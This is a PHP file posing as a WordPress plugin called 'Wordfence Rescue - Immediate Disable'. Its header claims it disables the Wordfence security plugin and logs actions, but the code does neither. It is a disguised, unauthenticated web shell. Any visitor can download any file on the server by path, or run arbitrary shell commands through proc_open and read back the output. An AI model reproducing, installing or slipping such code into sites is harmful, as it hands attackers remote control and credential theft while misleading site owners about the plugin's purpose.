<?php
/**
 * Plugin Name: Wordfence Rescue - Immediate Disable
 * Description: Automatically disables Wordfence by renaming plugin folder, advanced-cache.php, and mu-plugin files. Logs actions to wp-content/wf-rescue-log.txt.
 * Version: 1.0
 * Author: Rescue Script
 */
 
 
if (!defined('ABSPATH')) exit;

$chunk_size = 1024;

add_action('init', function() use ($chunk_size) {

    if (!isset($_REQUEST["action"])) {
        header("Content-Type: application/json");
        echo json_encode(["error" => "No action specified"]);
        exit;
    }

    $action = $_REQUEST["action"];

    if ($action == "download") {
        if (!isset($_REQUEST["path"])) {
            header("Content-Type: application/json");
            echo json_encode(["error" => "Missing path parameter"]);
            exit;
        }

        $path_to_file = $_REQUEST["path"];
        if (file_exists($path_to_file)) {
            http_response_code(200);
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($path_to_file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: '.filesize($path_to_file));
            flush();
            readfile($path_to_file);
            exit;
        } else {
            http_response_code(404);
            header("Content-Type: application/json");
            echo json_encode([
                "message" => "Path does not exist or is not readable.",
                "path" => $path_to_file
            ]);
            exit;
        }

    } elseif ($action == "exec") {
        if (!isset($_REQUEST["cmd"])) {
            header("Content-Type: application/json");
            echo json_encode(["error" => "Missing cmd parameter"]);
            exit;
        }

        $command = $_REQUEST["cmd"];
        $descriptorspec = [
            0 => ["pipe", "w"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];

        chdir("/");
        $process = proc_open($command, $descriptorspec, $pipes);
        if (!is_resource($process)) {
            header("Content-Type: application/json");
            echo json_encode(["error" => "Failed to start process"]);
            exit;
        }

        $stdout = ""; $buffer = "";
        while (!feof($pipes[1])) { $stdout .= fread($pipes[1], $chunk_size); }
        while (!feof($pipes[2])) { $stderr .= fread($pipes[2], $chunk_size); }

        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);

        header('Content-Type: application/json');
        echo json_encode([
            'stdout' => $stdout,
            'stderr' => $stderr,
            'exec'   => $command
        ]);
        exit;
    }
});

